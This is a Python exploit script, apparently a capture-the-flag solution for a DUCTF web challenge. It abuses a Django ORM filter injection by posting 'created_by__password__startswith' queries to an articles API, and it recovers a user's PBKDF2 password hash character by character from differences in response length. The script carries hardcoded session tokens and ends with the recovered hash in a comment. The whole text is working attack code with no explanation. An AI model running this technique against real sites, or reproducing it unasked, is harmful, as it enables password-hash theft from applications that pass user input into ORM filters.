import requests, string
wordlist = string.ascii_letters+string.digits+"/+="

url = "https://web-secureblog-b067c23e0c7d628d.2023.ductf.dev/api/articles/"
cookies = {"csrftoken": "FuqT6T06BQM5pGHtmYxpdLTCJYnEHSp8"}
headers = {
    "Content-Type": "application/json",
    "X-Requested-With": "XMLHttpRequest",
    "X-Csrftoken": "AyEcOKMEqepwYz1gxa7pdJ5nFIVnOH645SUVKtCARU1rd5yzJYuEgkOPew8Rlpl2",
    "Origin": "https://web-secureblog-b067c23e0c7d628d.2023.ductf.dev",
    "Referer": "https://web-secureblog-b067c23e0c7d628d.2023.ductf.dev/api/articles/"
}

# pwd = "pbkdf2_sha256$1000$"
pwd = "pbkdf2_sha256$1000$057C2I2qdGH98Hm2CSkiKZ$"
while True:
    for char in wordlist:
        tmp = pwd + char
        data = {
            "created_by__password__startswith": f"{tmp}"
        }
        x = requests.post(url=url, cookies=cookies, headers=headers, json=data)
        if len(x.text) > 2:
            pwd = tmp
            print("Current hash: " + pwd)
            break
    else:
        print("Hash is: " + pwd)
        exit(0)

# pbkdf2_sha256$1000$057C2I2qdGH98Hm2CSkiKZ$6Eq+K931+YFv4OV578LDDDyFoWEp2OClbcnRF1qxHjE=